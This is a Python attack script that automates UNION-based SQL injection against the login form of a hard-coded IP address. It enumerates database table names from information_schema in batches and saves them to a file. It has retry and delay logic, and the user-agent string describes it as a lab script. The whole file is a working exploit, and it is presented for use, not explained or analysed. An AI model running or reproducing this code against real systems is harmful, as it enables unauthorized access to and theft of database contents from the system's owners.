#!/usr/bin/env python3
import requests, time, re, sys
from html import unescape

# CONFIG
url = "http://3.144.177.217/login"
output_file = "tables_dump.txt"
payload_template = "username='+UNION+SELECT+GROUP_CONCAT(TABLE_NAME),'A'+FROM+(SELECT+table_name+FROM+information_schema.tables+ORDER+BY+table_name+LIMIT+{limit}+OFFSET+{offset})+t--+-&password=b"
limit = 20
offset = 0
batch_increase = 20
delay_seconds = 12.5
max_retries = 3
timeout_seconds = 15
user_agent = "Mozilla/5.0 (compatible; lab-script/1.0)"
consec_no_new_limit = 5
# END CONFIG

p_tag_re = re.compile(r"<p[^>]*>(.*?)</p>", re.IGNORECASE | re.DOTALL)

def extract_text(html):
    m = p_tag_re.search(html)
    if not m:
        return None
    inner = re.sub(r"<[^>]+>", "", m.group(1))
    return unescape(inner).strip()

def parse_items(text):
    if not text:
        return []
    idx = text.lower().find("for")
    if idx != -1:
        text = text[idx+3:]
    return [x.strip() for x in text.split(",") if x.strip()]

def send_request(session, payload):
    headers = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": user_agent, "Accept": "*/*"}
    resp = session.post(url, data=payload, headers=headers, timeout=timeout_seconds)
    return resp.status_code, resp.text

def main():
    session = requests.Session()
    seen = set()
    consec_no_new = 0
    open(output_file, "w").close()
    global offset
    while True:
        payload = payload_template.format(limit=limit, offset=offset)
        print(f"\nOFFSET: {offset}")
        print("PAYLOAD:", payload)
        attempt = 0
        html = None
        while attempt < max_retries:
            try:
                attempt += 1
                print(f"[{attempt}] sending request...")
                status, html = send_request(session, payload)
                print(f"[{attempt}] status {status}, response length {len(html)}")
                break
            except Exception as e:
                wait = min(30, 2 ** attempt)
                print(f"[{attempt}] error: {e}, retrying in {wait}s")
                time.sleep(wait)
        if html is None:
            break
        extracted = extract_text(html)
        if not extracted:
            print("No <p> found")
            consec_no_new += 1
        else:
            items = parse_items(extracted)
            new_items = [i for i in items if i not in seen]
            if new_items:
                print(f"Found {len(new_items)} new items")
                with open(output_file, "a", encoding="utf-8") as f:
                    for it in new_items:
                        f.write(it + "\n")
                        seen.add(it)
                consec_no_new = 0
            else:
                print("No new items")
                consec_no_new += 1
        print("Total unique so far:", len(seen))
        if consec_no_new >= consec_no_new_limit:
            print("Stopping: consecutive no-new limit reached")
            break
        offset += batch_increase
        print(f"Sleeping {delay_seconds}s before next batch")
        time.sleep(delay_seconds)
    print("DONE. Total unique items saved:", len(seen))

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
